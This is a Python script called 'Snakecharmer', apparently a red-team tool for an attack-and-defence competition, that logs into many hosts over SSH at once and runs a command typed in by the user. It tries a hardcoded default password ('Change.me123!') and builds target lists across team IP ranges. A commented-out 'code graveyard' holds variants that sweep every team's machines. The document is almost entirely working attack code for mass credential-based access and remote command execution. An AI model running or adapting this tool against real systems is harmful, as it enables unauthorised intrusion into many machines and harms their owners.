#Garrett was here
#Snakecharmer!
#Connect to devices en mass to run basic commands through password based authentication.
#Targets blueteamers with leaked / default credentials
import paramiko
from concurrent.futures import ThreadPoolExecutor

WORKERS=10 #how many threads run at once

def single_connection_command(hostname_in,username_in,password_in,command_in):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("Connecting to box", hostname_in)
        client.connect(hostname_in,username=username_in,password=password_in,timeout=5)
        stdin, stdout, stderr = client.exec_command(command_in)
        print(stdout.read().decode())
    except paramiko.AuthenticationException :
        print("error, invalid credentials for box: ",hostname_in,", ",username_in,":",password_in,sep="")
    except paramiko.SSHException as e:
        print("ssh error,",e)
    except Exception as e:
        print("Unexpected error on host ",hostname_in,", ",e,sep="")

def make_target_list(ip_string, variable_list): # pass it a string to be modified (ex 192.168.x.2 or 10.x.1.5), and a list of numbers to fill it in with ex [1,2,5,6,7,8]
    to_return=list()
    for number in variable_list:
        to_return.append(str(ip_string).replace('x',str(number)))
    return to_return

def make_target_list_two_var(ip_string, variable_list_x, variable_list_y): 
    to_return=list()
    for number_x in variable_list_x:
        for number_y in variable_list_y:
            to_return.append(str(ip_string).replace('x',str(number_x)).replace('y',str(number_y)))
    return to_return


def run_multiple_multithread(ip_list,username,password,command):
    # target_list=make_target_list(ip_string,ip_list)
    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        for ip in ip_list:
            executor.submit(single_connection_command, ip,username,password,command)


def team_attack(teamnumber,username,password,command):
    targets=make_target_list("192.168."+str(teamnumber)+".x",[1,2])
    targets2=make_target_list("10."+str(teamnumber)+".1."+'x',[4,5,6])
    targets=targets+targets2
    run_multiple_multithread(targets,username,password,command)


def cli_interface():
    box_targets=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']
    print("\n ~~ SNAKE CHARMER ~~\n")
    
    #Basic input fields
    username=input("Target user: ")
    password=input("Target Password (leave blank for default): ")
    if password=="":
        password="Change.me123!"
    print("Using credentials ",username,":",password,sep="")
    command=input("\nCommand to run: ")

    #Get the target ip
    targets_input = input("Enter either a: \n-Single IP address\n-IP target framework ('192.168.x.y/10.x.1.y'), \n-A single team name ('team01','team02','team13 [include leading 0]'), a single box type ('Viking Raid')\n-All ('All')\nInput: ").upper()
    print(targets_input)

    if "TEAM" in targets_input:
        if targets_input[-2:-1]=="1":
            teamnum=targets_input[-2:]
        else:
            teamnum=targets_input[-1:]
        if (int(teamnum)>19 and int(teamnum)<0):
            raise IndexError("Team number is not between 1 and 18")
        team_attack(teamnum,username,password,command)

    elif any(box in targets_input for box in box_targets):
        print('brooooo get that boox')
    elif "ALL" in targets_input:
        pass
    else:
        x_number=input("Enter every number you want for x (ex 1 or 1,2,4,5,6)\nx field:")
        y_number=input("Enter every number you want for y (ex 1 or 1,2,4,5,6)\ny field:")
        print(input,x_number,y_number)#TODO add a catch / exception raise if invalid input is given via a failed parse
        
def main():
    cli_interface()

if __name__=="__main__":
    main()


'''
code graveyard



def run_on_every_linux_in_team_cloud(team_num,username,password,command):
    ip_addresses=".1",".2",".4",".5",".6"
    final_ips=list()
    for ip in ip_addresses:
        final_ips.append("192.168."+str(team_num)+ip)

    with ThreadPoolExecutor(max_workers=10) as executor:
        for ip in final_ips:
            executor.submit(single_connection_command, ip,username,password,command)

def run_on_every_linux_in_team_lan(team_num,username,password,command):
    ip_addresses="1","2","4","5","6"
    final_ips=list()
    for ip in ip_addresses:
        final_ips.append("10."+str(team_num)+".1."+ip)

    with ThreadPoolExecutor(max_workers=10) as executor:
        for ip in final_ips:
            executor.submit(single_connection_command, ip,username,password,command)

def run_on_every_team_one_box_cloud(box_numb,username,password,command):
    teams=list(range(18))
    ip_start="192.168."
    final_ips=list()
    for num in teams:
        final_ips.append(ip_start+str(num)+"."+str(box_numb))

    with ThreadPoolExecutor(max_workers=10) as executor:
        for ip in final_ips:
            executor.submit(single_connection_command, ip,username,password,command)


'''